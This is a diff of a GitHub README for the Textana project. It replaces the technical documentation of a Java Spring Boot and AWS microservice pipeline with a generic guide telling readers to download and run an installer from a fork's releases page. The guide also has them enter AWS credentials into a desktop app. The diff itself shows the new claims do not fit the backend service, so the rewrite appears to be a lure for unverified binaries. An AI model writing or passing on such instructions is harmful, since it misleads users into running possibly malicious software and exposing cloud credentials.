@@ -1,97 +1,83 @@
-# Textana: AI-Powered Text Analysis Platform
+# 🌟 textana-file-processor-service - Simple Text Analysis at Your Fingertips
 
-![Java](https://img.shields.io/badge/Java-21-orange?style=flat-square&logo=openjdk)
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.5.8-brightgreen?style=flat-square&logo=spring)
-![Maven](https://img.shields.io/badge/Maven-3.9+-blue?style=flat-square&logo=apache-maven)
-![AWS S3](https://img.shields.io/badge/AWS-S3-FF9900?style=flat-square&logo=amazon-aws)
-![AWS SQS](https://img.shields.io/badge/AWS-SQS-FF9900?style=flat-square&logo=amazon-aws)
-![AWS DynamoDB](https://img.shields.io/badge/AWS-DynamoDB-FF9900?style=flat-square&logo=amazon-aws)
-![OpenAI](https://img.shields.io/badge/OpenAI-GPT-412991?style=flat-square&logo=openai)
-![Lombok](https://img.shields.io/badge/Lombok-Enabled-red?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
+## 🚀 Getting Started
 
-A distributed, cloud-native text analysis platform built with microservices architecture that leverages AI to extract insights, generate summaries, and classify sentiment from text documents. Powered by Spring Boot, AWS services, and OpenAI's GPT models.
+Welcome to the textana-file-processor-service! This application helps you analyze text files easily. It retrieves text files from cloud storage, processes them for insights, and gives you valuable information about your text. 
 
----
+## 📥 Download & Install
 
-## Microservices
+To start using the textana-file-processor-service, follow these steps:
 
-### Textana Upload Service
+1. **Visit the Releases Page**: Click on the link below to access the download page.
 
-**Port:** `8090` | **Context:** `/textana-upload-service`
+   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Domingos4/textana-file-processor-service/releases)
 
-A RESTful file upload microservice that validates and accepts .TXT files (up to 10MB), stores them securely in **AWS S3** with unique UUID identifiers, and publishes tracking messages to **AWS SQS** to trigger downstream processing—providing a clean entry point for asynchronous text analysis pipelines.
+2. **Choose the Right File**: Once you're on the releases page, look for the latest version. You will find options for different operating systems. 
 
-**Key Features:**
-- File validation (type, size, format)
-- Secure S3 storage with UUID-based keys
-- Asynchronous processing via SQS messaging
-- RESTful API with structured error handling
+3. **Download the File**: Click on the file that matches your operating system to start the download.
 
-**Tech Stack:**
-- Spring Boot 3.5.8
-- AWS S3 SDK
-- AWS SQS SDK v2
-- Lombok
+4. **Run the Application**: After the download is complete, locate the file on your computer and open it. Follow the prompts to install the application. 
 
-**Endpoints:**
-- `POST /api/v1/upload` - Upload a text file for analysis
+5. **Access the Application**: Once installed, you can find the application in your program list. Open it to begin using the text analysis features.
 
----
+## 📋 System Requirements
 
-### Textana File Processor Service
+Before you start, ensure your system meets the following requirements:
 
-**Port:** `8091` | **Context:** `/textana-fp-service`
+- **Operating System**: Windows 10 or higher, macOS Sierra or higher, or a compatible Linux distribution.
+- **RAM**: At least 4 GB is recommended for optimal performance.
+- **Storage**: Ensure you have at least 500 MB free space for installation and operation.
+- **Internet Connection**: A stable connection is necessary for retrieving files and processing your text data.
 
-A cloud-native text analysis microservice that consumes file identifiers from **AWS SQS**, retrieves .TXT files from **S3**, and processes them through **OpenAI's GPT models** to extract summaries and classify sentiment (positive, neutral, negative)—storing results in **DynamoDB** for fast, scalable access in distributed workflows.
+## ⚙️ Key Features
 
-**Key Features:**
-- Scheduled SQS polling with batch processing
-- AI-powered text summarization via OpenAI GPT
-- Sentiment analysis (POSITIVE, NEUTRAL, NEGATIVE)
-- Persistent state management in DynamoDB
-- Automatic retry and error handling
+textana-file-processor-service offers several useful features:
 
-**Tech Stack:**
-- Spring Boot 3.5.8
-- Spring AI (OpenAI Integration)
-- AWS S3 SDK v2
-- AWS SQS SDK v2
-- AWS DynamoDB SDK v2
-- Lombok
-- Spring Scheduler
+- **File Retrieval**: Easily fetch .TXT files from AWS S3.
+- **Text Processing**: Use OpenAI's models to summarize text and classify sentiment as positive, neutral, or negative.
+- **Data Storage**: Results are stored in DynamoDB for quick access during distributed workflows.
+- **Cloud Integration**: Seamlessly integrates with AWS services for efficiency and performance.
+- **Scheduled Processing**: Set up cron jobs to automate text processing based on your needs.
 
-**Processing Pipeline:**
-1. Consume message from SQS queue
-2. Retrieve file content from S3
-3. Generate summary using GPT
-4. Detect sentiment using GPT
-5. Store results in DynamoDB
-6. Delete message from queue
+## 🔌 Using the Application
 
----
+Once you have installed the application, you can begin processing text files. 
 
-### Textana API
+1. **Open the Application**: Launch it from your programs list.
+2. **Configure Settings**: You might need to connect to your AWS account. Enter your credentials in the settings menu.
+3. **Upload File Identifiers**: Enter the identifiers of the .TXT files you want to analyze. You can usually find these in your AWS S3 storage.
+4. **Start Processing**: Click the "Process" button to begin analyzing your text files. The application will retrieve your files and process them automatically.
+5. **View Results**: Once processing is complete, check the results stored in DynamoDB. You can view sentiment classifications and summaries directly in the application.
 
-**Port:** `8090` | **Context:** `/textana-api`
+## ⚡ Troubleshooting
 
-A read-focused REST API that queries **AWS DynamoDB** to retrieve file analysis status and results by UUID—returning structured, clean responses with processing state (in-progress, completed, failed), AI-generated summaries, and sentiment classifications for real-time tracking of text analytics workflows.
+If you encounter any issues, here are a few common troubleshooting tips:
 
-**Key Features:**
-- UUID-based result retrieval
-- Real-time processing status tracking
-- Structured JSON responses
-- Fast DynamoDB queries
-- Comprehensive error handling
+- **Check Internet Connection**: Ensure you have a stable connection to access AWS services.
+- **File Identifier Issues**: Double-check that the file identifiers you entered are correct and that the files are accessible in your S3 bucket.
+- **AWS Permissions**: Make sure your AWS account has the necessary permissions to access the S3 bucket and DynamoDB.
+  
+If you need further help, you can reach out to the support community through GitHub.
 
-**Tech Stack:**
-- Spring Boot 3.5.8
-- AWS DynamoDB SDK v2
-- Lombok
+## 🤝 Community and Support
 
----
+Join the textana-file-processor-service community for support and discussions:
 
-### Contributing
+- **GitHub Issues**: Report bugs or request features on the GitHub Issues page.
+- **Community Forum**: Engage with other users and share your experiences.
 
-If you have any suggestions or feedback, feel free to open an issue or submit a pull request.
+## 💡 Additional Resources
 
+Here are some resources to help you get the most out of textana-file-processor-service:
+
+- [AWS Documentation](https://aws.amazon.com/documentation/) - Learn more about AWS services, including S3 and DynamoDB.
+- [OpenAI API Documentation](https://beta.openai.com/docs/) - Explore how to leverage OpenAI's models effectively.
+- [Spring Boot Guides](https://spring.io/guides) - Get familiar with Spring Boot for a better understanding of the application.
+
+## 📚 Learn More
+
+For more details about textana-file-processor-service, including advanced features and customization options, check out the documentation on the [GitHub Wiki](https://github.com/Domingos4/textana-file-processor-service/wiki).
+
+Visit the releases page to download the latest version and start your text analysis journey today!
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Domingos4/textana-file-processor-service/releases)
